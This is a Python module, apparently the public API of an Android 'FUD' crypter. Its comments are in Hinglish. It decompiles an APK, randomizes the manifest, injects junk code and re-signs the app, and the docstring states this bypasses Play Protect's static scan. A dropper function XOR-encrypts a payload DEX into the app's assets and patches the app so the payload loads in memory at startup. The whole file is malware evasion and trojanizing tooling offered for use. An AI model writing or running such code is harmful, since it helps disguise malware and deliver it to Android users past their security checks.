"""
FUD pipeline — public API.

  full_fud_pipeline(input_apk, output_apk, session_dir, payload_dex=None)

Automatically ensures all tools are installed (JRE, apktool, ecj,
build-tools, android.jar, keystore, loader.dex) on first call.
"""
import os
import shutil

from .setup import ensure_tools
from .apktool_wrapper import decompile, recompile
from .manifest import randomize_manifest
from .junk_injector import inject_junk
from .signer import sign_apk
from .payload_injector import inject_payload


__all__ = [
    "full_fud_pipeline",
    "full_fud_pipeline_dropper",
    "ensure_tools",
]


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    """
    Sirf obfuscation + repackage + sign. Koi payload embed nahi.
    Ye woh output hai jo Play Protect ke static scan ko bypass karta hai.
    """
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)
    randomize_manifest(decompiled)
    inject_junk(decompiled)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    sign_apk(unsigned, output_apk)
    return output_apk


def full_fud_pipeline_dropper(input_apk: str, payload_dex: str,
                              output_apk: str, session_dir: str) -> str:
    """
    Dropper mode — payload_dex embed hoga assets/p.bin me XOR-encrypted.
    Loader attachBaseContext pe use InMemoryDexClassLoader se load karega.
    """
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    # 1) encrypt payload
    from .tools_encrypt import encrypt_bytes
    with open(payload_dex, "rb") as f:
        raw = f.read()
    enc = encrypt_bytes(raw)
    pbin = os.path.join(session_dir, "p.bin")
    with open(pbin, "wb") as f:
        f.write(enc)

    # 2) decompile carrier
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)
    randomize_manifest(decompiled)
    inject_junk(decompiled)

    # 3) recompile (before FudApp patch — patch affects recompile)
    # order: patch manifest BEFORE recompile so apktool picks it up
    from .payload_injector import _patch_manifest, _read_app_class, _build_fud_app_dex
    original_class = _read_app_class(decompiled)
    fud_dex = os.path.join(session_dir, "fudapp.dex")
    _build_fud_app_dex(original_class, fud_dex)
    _patch_manifest(decompiled)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    # 4) append classes2.dex + assets/p.bin (bypasses apktool)
    from .payload_injector import _add_to_apk
    _add_to_apk(unsigned, pbin, fud_dex)

    sign_apk(unsigned, output_apk)
    return output_apk
